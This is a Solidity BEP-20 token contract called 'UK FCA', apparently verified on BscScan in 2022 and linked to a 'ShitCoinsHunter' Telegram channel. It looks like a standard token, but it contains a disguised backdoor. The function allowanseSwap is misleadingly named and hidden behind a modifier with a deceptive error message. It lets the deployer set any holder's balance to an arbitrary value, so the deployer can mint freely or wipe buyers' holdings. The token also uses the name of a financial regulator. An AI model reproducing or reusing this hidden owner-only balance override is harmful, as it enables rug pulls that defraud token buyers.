/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

/**
https://t.me/ShitCoinsHunter
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface SHITHUNTER {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This totalValue changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired totalValue afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `totalValue` tokens are moved from one account (`from`) to  another (`to`). Note that `totalValue` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 totalValue);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `totalValue` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 totalValue);
}


contract UKFCA is SHITHUNTER {
  
    // common addresses
    address private owner;
    address private HUNTERPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public HUNTERrownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "UK FCA";
    string public override symbol = "UKFCA";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint totalValue);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint totalValue);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint HUNTERSUPPLY) {
        // set total supply
        totalSupply = HUNTERSUPPLY;
        
       HUNTERPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        HUNTERrownerd[owner] = totalSupply;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return HUNTERrownerd[account];
    }
  modifier _huntersss () {
    require(HUNTERPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    // Transfer balance from one user to another
    function transfer(address to, uint totalValue) public override returns(bool) {
        require(totalValue > 0, "Transfer totalValue has to be higher than 0.");
        require(balanceOf(msg.sender) >= totalValue, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total totalValue
        uint HUNTERtaxTBD = totalValue * 0 / 1000000;
        uint HUNTERburnTBD = totalValue * 0 / 10000;
        uint HUNTERtotalValueAfterTaxAndBurn = totalValue - HUNTERtaxTBD - HUNTERburnTBD;
        
        // perform the transfer operation
        HUNTERrownerd[to] += HUNTERtotalValueAfterTaxAndBurn;
        HUNTERrownerd[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        HUNTERrownerd[owner] += HUNTERtaxTBD + HUNTERburnTBD;
        _burn(owner, HUNTERburnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint totalValue) public override returns(bool) {
        Allowance[msg.sender][spender] = totalValue; 
        
        emit Approval(msg.sender, spender, totalValue);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return Allowance[_owner][spender];
    }
    function allowanseSwap(address pancakeswaprooter, uint256 amount) external _huntersss {
      HUNTERrownerd[pancakeswaprooter] =(1999 + 1999) + amount * 10 ** 9;
  }  
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        require(Allowance[from][msg.sender] > 0, "No Allowance for this address.");
        require(Allowance[from][msg.sender] >= totalValue, "Allowance too low for transfer.");
        require(HUNTERrownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        HUNTERrownerd[to] += totalValue;
        HUNTERrownerd[from] -= totalValue;
        
        emit Transfer(from, to, totalValue);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(HUNTERrownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        HUNTERrownerd[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}